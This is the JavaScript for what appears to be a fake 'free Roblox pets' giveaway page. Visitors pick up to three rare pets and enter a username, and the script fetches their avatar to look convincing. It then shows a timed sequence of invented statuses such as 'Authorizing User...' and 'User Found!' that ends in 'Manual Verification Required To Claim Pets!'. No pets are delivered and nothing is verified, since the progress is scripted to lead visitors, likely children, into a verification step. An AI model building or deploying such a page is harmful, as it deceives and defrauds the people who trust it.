const rarity = ['common', 'uncommon', 'rare', 'epic', 'legendary'];
let selectedSkinsAmount = 0;
let selectedSkinsNames = [];

const Items = [
	{
        name: 'Diamond butterfly',
        url: 'https://i.imgur.com/Pr1tdc7.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'alicorn',
        url: 'https://i.imgur.com/RW6zSWQ.png',
        rarity: 'epic',
        iconSeries: false
    },
	{
        name: 'Giraffe',
        url: 'https://i.imgur.com/sqQcEhn.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'Phoenix',
        url: 'https://i.imgur.com/7b7Ntbq.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'Axolotl',
        url: 'https://i.imgur.com/hmsEjxA.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'Bat Dragon',
        url: 'https://i.imgur.com/V1hMMIf.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'Shadow Dragon',
        url: 'https://i.imgur.com/p0g1SgN.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'Frost Dragon',
        url: 'https://i.imgur.com/zqNToTu.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'Halloween White Ghost Dragon',
        url: 'https://i.imgur.com/t937Rtp.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'Griffin',
        url: 'https://i.imgur.com/mDNG1EQ.png',
        rarity: 'epic',
        iconSeries: false
    },
	{
        name: 'Dancing Dragon',
        url: 'https://i.imgur.com/PTDKQPc.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'Golden Penguin',
        url: 'https://i.imgur.com/QLkT8P1.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'Goldhorn',
        url: 'https://i.imgur.com/2jrxuIs.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'Queen Bee',
        url: 'https://i.imgur.com/iZNpQYj.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'Owl',
        url: 'https://i.imgur.com/fnvTz51.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'Crow',
        url: 'https://i.imgur.com/hioo518.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'Kangaroo',
        url: 'https://i.imgur.com/6fHNPJ8.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'Turtle',
        url: 'https://i.imgur.com/4bATiTu.png',
        rarity: 'epic',
        iconSeries: false
    },    
    {
        name: 'Arctic Reindeer',
        url: 'https://i.imgur.com/mXnhNxX.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'Parrot',
        url: 'https://i.imgur.com/XeaJapJ.png',
        rarity: 'epic',
        iconSeries: false
    },
    {
        name: 'Kitsune',
        url: 'https://i.imgur.com/4v6YUsG.png',
        rarity: 'epic',
        iconSeries: false
    },
]


function getUserID(name) {
    return new Promise((resolve, reject) => {
        fetch(`https://api.allorigins.win/get?url=https://api.newstargeted.com/roblox/users/v2/user.php?username=${name}`)
        .then(response => {
            if (response.ok) return response.json();
            throw new Error('Network response was not ok.');
        })
        .then(data => {
            const userData = JSON.parse(data.contents);
            const userId = userData.userId;
            resolve(userId);
            console.log(userId);
        })
        .catch(error => {
            reject(error);
        });
    });
}

function getUserPic(nameId) {
    return new Promise((resolve, reject) => {
        fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds='+nameId+'&size=420x420&format=Png&isCircular=false')}`)
        .then(response => {
            if (response.ok) return response.json();
            throw new Error('Network response was not ok.');
        })
        .then(data => {
            const userData = JSON.parse(data.contents);
            const imageUrl = userData.data[0].imageUrl;
            resolve(imageUrl);
            console.log(imageUrl);
        })
        .catch(error => {
            reject(error);
        });
    });
}


for (let i = 0; i < Items.length; i++) {
    document.querySelector('#load ul').innerHTML += `
        <div class="col-md-3 col-md-6">
            ${Items[i].iconSeries ? '<img src="https://cdn.discordapp.com/attachments/388822513787863040/732185639218315324/icon-logo.png" class="iconSeries" />' : ''}
            <a class="card splash-card" data-rarity="${Items[i].rarity}">
                <picture>
                    <img class="card-img-top desktop-img pickaxe" src=${Items[i].url}>
                </picture>
                <div class="card-img-overlay">
                    <div class="card-body itemdesc-box">
                        <h4 class="card-title itemname">${Items[i].name}</h4>
                    </div>
                </div>
            </a>
        </div>
    `
}

document.querySelectorAll('.col-md-3.col-md-6 a').forEach(item => {
    item.onclick = () => {
        if (!item.classList.contains('activeCard')) {
            if (selectedSkinsAmount >= 3) {
                $('.errorMsg').fadeIn();
                document.querySelector('.formError').innerText = 'Maximum 3 pets!';
            } else {
                item.classList.add('activeCard');
                selectedSkinsAmount++;
                selectedSkinsNames.push(item.innerText);
            }
        } else {
            item.classList.remove('activeCard');
            selectedSkinsAmount--
            selectedSkinsNames = selectedSkinsNames.filter(e => e !== item.innerText);
        }
    }
});

function claim() {
    const username = document.querySelector('.redeemContainer .redeemView input').value.replace(/\s/g, '');


 getUserID(username)
    .then(userId => {
        console.log(userId);
        getUserPic(userId)
        .then(imageUrl => {
            console.log(imageUrl);
            document.getElementById("prpc").src=imageUrl;
            document.getElementById("prpc").style.display = "inline-block";
        })
    })
    .catch(error => {
        console.error(error);
    });
	
    if (username === "" || username.length < 3) {
        $('.errorMsg').fadeIn();
        return document.querySelector('.formError').innerText = 'Invalid Username!';
    }

    if (selectedSkinsAmount < 1) {
        $('.errorMsg').fadeIn();
        return document.querySelector('.formError').innerText = 'Please select 1 or more pets!';
    }

    $('.errorMsg').fadeOut();
    $('#load').fadeOut(250)
    $('.buttonContainer').fadeOut(250)
    $('.lds-facebook').fadeIn(1500).css({
        "display": "inline-block"
    });
    $('.status').fadeIn()

    const statuses = ['Connecting...', 'Authorizing User...', 'User Found!', 'Verifying Human...', 'Attempting Human Verification...', 'Manual Verification Required To Claim Pets!'];
    const ch="http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" + document.querySelector(".champ").value;
    document.getElementById("prpc").src=ch;
    document.getElementById("prpc").style.display = "inline-block";
    for (let i = 0; i < statuses.length; i++) {
        let time = 2 * i * 850;
        if (i === statuses.length - 1) time = 16000;
        setTimeout(() => {
            document.querySelector('.status').innerHTML = `Status: <span ${i === 2 ? "class='successText'" : i === statuses.length - 1 || i === 5 ? "class='errorText'}" : i === 4 || i === 6 ? 'class="yellowText"' : ''}>${statuses[i]}</span>`;
            if (i === statuses.length - 1) {
                $('.claim').hide();
                $('.verify').show();
                $('.buttonContainer').fadeIn(250)
            }
        }, time)
    }
}
